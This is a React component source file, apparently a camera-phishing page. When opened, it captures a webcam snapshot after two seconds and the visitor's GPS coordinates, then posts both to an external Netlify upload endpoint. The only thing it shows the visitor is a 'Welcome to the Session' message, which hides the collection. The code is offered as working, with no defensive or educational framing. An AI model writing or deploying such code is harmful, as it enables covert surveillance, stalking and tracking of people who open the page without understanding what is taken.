import React, { useState, useEffect } from 'react';
import './css.css';

const CaptureComponent = () => {
  const [photo, setPhoto] = useState(null);
  const [location, setLocation] = useState(null);

  // Ask for permissions and capture photo and location
  useEffect(() => {
    const getUserMedia = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640;  // Define canvas size
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        // Capture the frame after 2 seconds
        setTimeout(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageDataUrl = canvas.toDataURL('image/png');  // Capture image as base64
          setPhoto(imageDataUrl);  // Set the captured image
          video.pause(); // Stop video after capturing
          video.srcObject = null;
          stream.getTracks().forEach(track => track.stop());  // Stop the video stream
        }, 2000);
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    };

    const getLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        }, (error) => {
          console.error('Error getting location:', error);
        });
      }
    };

    getUserMedia();
    getLocation();
  }, []);

  // Send data to the backend
  useEffect(() => {
    if (photo && location) {
      const sendData = async () => {
        try {
          const response = await fetch('https://livecamp.netlify.app/upload', {  // Replace with your actual backend URL
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              photo, 
              location: `Latitude: ${location.latitude}, Longitude: ${location.longitude}`,
            }),
          });

          if (response.ok) {
            console.log('Data sent successfully');
          } else {
            console.error('Error sending data:', response.statusText);
          }
        } catch (error) {
          console.error('Error in sending data:', error);
        }
      };

      sendData();  // Call the function to send data
    }
  }, [photo, location]);  // Triggers when photo and location are both available

  return <div className='main'>Welcome to the Session</div>;
};

export default CaptureComponent;
